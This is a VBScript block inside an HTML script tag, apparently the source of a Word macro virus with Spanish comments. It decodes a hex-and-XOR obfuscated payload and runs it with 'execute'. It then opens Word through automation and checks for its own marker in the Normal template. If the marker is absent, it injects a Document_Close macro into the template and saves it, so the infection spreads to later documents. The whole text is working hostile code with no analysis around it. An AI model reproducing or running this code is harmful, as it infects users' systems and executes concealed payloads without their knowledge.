<Script Language='vbScript'>
dim zacged
zacged= nt7("6D6F72757361")
Function meteorito_nt7(nt7)
Dim rv
j = Len(zacged)
For i = 1 To Len(nt7)
c1 = Mid(nt7, i, 1)
c2 = Mid(zacged, j, 1)
If rv = True Then 
j = j + 1
Else  
j = j - 1
End If
If j = Len(zacged) Then j = j - 1: rv = False
If j = 0 Then j = 1: rv = True
meteorito_nt7 = meteorito_nt7 & Chr(Asc(c1) Xor Asc(c2))
Next
End Function
Function nt7(x)
Dim j 
Dim at
j = 1
While j < Len(x) :at = Chr(rd2v(Mid(x, j, 2))):nt7 = nt7 & at:j = j + 2:Wend:End Function
Sub reg
on error resume next
rhlm = "2E1D55371D1F021D52271600001F0A4D230A0A017E79361D011E194F313B2037554F4F4F1F001D012F1710140E18011B507879301A1C1C194D223E554E53533A575D5D5F4245434178782C02031C06552630554F4F4B25574245434345425E60672C1D1B000755011B094D525257200711200A0A3D1D1D03517E7F3100031E1B5200011C1852524D4F414229041C0716331E080C07071A070C5062672E001C06075314011A1F020252485351061D09191A0E00102F1E1C111D021E0014012F1C1314060E08335055535447425F5E413702594143454243545A6278311A1E551B626729061F55007E7F3606004D1D17017E7926171B4D00031A07534E55311D080C1B173A111910111B454F221B16011C061D0919430C1F111F1A17504660672614553D1C01520201051D5C021E1A361D0103080C065D303D2636434D38212259532302163F414D222259533F365E4F1E444F261D161D78782A011E0A7F7F20160152064D504F015B1416015A1C1909467F7F351C0752054D504F4A55271C55435E60671D1701534E551B413E081B36223C2131240E01180A5A20305F55131C181F001F5555531F52494D181D1D185F53573E0A1B0803505953425C7F651F081B5248531A5B210A1929383D273725141E1A08453A3159531206071D02004F5455195353521A1F02025E55513216110A1E1E39303A3E5159525E44606500100753485206433E0A0631243C2736390C011A175D3E3F59520E1E181D1D18535555184F4B4D1A001A1E5F555023081B0A1E575F425C7F65230817067879361B164F240B"
execute meteorito_nt7(nt7(rhlm))
call bobsponja
end sub 
Function rd2v(rol)
rd2v = (art(Mid(rol, 1, 1)) * 16) + art(Mid(rol, 2, 1))
End Function
Function art(l)
Select Case l
Case chr(69): art = 14
Case chr(66): art = 11
Case chr(67): art = 12
Case chr(65): art = 10
Case chr(68): art = 13
Case chr(70): art = 15
Case Else 
art = Int(l)
End Select
End Function
function morusa
call reg
end function
sub bobsponja
dim dw
set dw = createobject(nt7("776F72642E6170706C69636174696F6E"))
while dw = ""
doevents
wend
dw.Documents.Add
if dw.normaltemplate.VBProject.VBComponents.item(1).name = zacged then 
dw.Documents(dw.activedocument.name).Close false
dw.quit
exit sub
end if
dw.Normaltemplate.VBProject.vbcomponents.Item(1).codemodule.addfromstring (patricio)
dw.NormalTemplate.save
dw.Documents(dw.activedocument.name).Close false
dw.quit
end sub  
function patricio
mc = nt7("----Vx macro ---")
enk = nt7("507269766174652053756220446F63756D656E745F436C6F73652829") & vbCrLf & nt7("44696D2065786520417320537472696E67") & vbCrLf
exe = ""

'-------------- *Final* --------------------> Partiendo el exe para la macro al igual dentro del exe

prt = "exe = exe & " & Chr(34) & Mid(exe, 1, 200) & Chr(34) & " & _" & vbCrLf
exe = Mid(exe, 201, Len(exe))
cont = 1
While Not acaba
  If cont = 8 Then
    prt = prt & Chr(34) & Mid(exe, 1, 200) & Chr(34) & vbCrLf
    exe = Mid(exe, 201, Len(exe))
    If Len(exe) <= 200 Then
      prt = prt & Chr(34) & Mid(exe, 1, Len(exe)) & Chr(34) & vbCrLf
      acaba = True
    End If
    prt = prt & "exe = exe & " & Chr(34) & Mid(exe, 1, 200) & Chr(34) & " & _" & vbCrLf
    exe = Mid(exe, 201, Len(exe))
    cont = 1
  Else
    prt = prt & Chr(34) & Mid(exe, 1, 200) & Chr(34) & " & _" & vbCrLf
    exe = Mid(exe, 201, Len(exe))
    If Len(exe) <= 200 Then
      prt = prt & Chr(34) & Mid(exe, 1, Len(exe)) & Chr(34) & vbCrLf
      acaba = True
    End If
  End If
cont = cont + 1
Wend

patricio = enk & prt & mc 'Ensamblando el exe encriptado

end function
</script>